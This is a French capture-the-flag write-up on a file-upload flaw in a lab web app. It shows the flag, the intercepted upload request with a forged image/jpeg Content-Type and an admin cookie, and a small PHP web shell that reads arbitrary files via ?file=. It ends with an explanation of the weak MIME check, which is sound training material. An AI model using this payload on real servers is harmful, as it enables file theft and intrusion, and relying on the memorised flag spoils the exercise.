The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8


Il faut intercepter la requete Post pour upload l'image et changer 
Content-Type: application/x-php
par 
Content-Type: image/jpeg

POST /?page=upload HTTP/1.1
Host: 192.168.1.33
Content-Length: 597
Cache-Control: max-age=0
Accept-Language: fr-FR,fr;q=0.9
Origin: http://192.168.1.33
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNHtXWgyPKt1jS4A8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.33/?page=upload
Accept-Encoding: gzip, deflate, br
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: keep-alive

------WebKitFormBoundaryNHtXWgyPKt1jS4A8
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryNHtXWgyPKt1jS4A8
Content-Disposition: form-data; name="uploaded"; filename="test.php"
Content-Type: application/x-php

<?php
if (isset($_GET['file'])) {
    echo "<pre>";
    echo file_get_contents($_GET['file']);
    echo "</pre>";
} else {
    echo "Veuillez fournir un fichier avec ?file=chemin_du_fichier.";
}
?>


------WebKitFormBoundaryNHtXWgyPKt1jS4A8
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryNHtXWgyPKt1jS4A8--


---------------------------------------------------------------------
Le type de vulnérabilité exploité ici est lié à l'upload de fichier non sécurisé.
Description :

Dans ce cas, l'application web accepte des fichiers uploadés par l'utilisateur, mais ne valide pas correctement le type MIME du fichier. Bien qu'une vérification soit effectuée pour s'assurer que les fichiers sont des images, cette vérification repose uniquement sur le type MIME indiqué dans l'en-tête HTTP, qui peut être falsifié. En conséquence, un fichier malveillant comme un script PHP peut être déguisé en image en modifiant le type MIME (Content-Type).

Lors de l'upload, l'application suppose que le fichier est une image (par exemple, image/jpeg), mais le contenu réel est un script PHP. Si ce fichier est ensuite accessible via le serveur et interprété comme du code, il peut être utilisé pour exécuter des commandes malveillantes, accéder à des fichiers sensibles, ou obtenir un accès non autorisé au serveur.
Points clés :

    Type MIME manipulable : L'en-tête Content-Type peut être modifié manuellement pour tromper le serveur.
    Vérification insuffisante côté serveur : L'application ne valide pas correctement le contenu ou l'extension réelle du fichier.
    Exécution de code malveillant : Une fois uploadé, le fichier peut être utilisé pour exécuter des commandes sur le serveur.

Ce type de vulnérabilité est courant lorsque les développeurs ne mettent pas en œuvre des validations robustes sur les fichiers uploadés.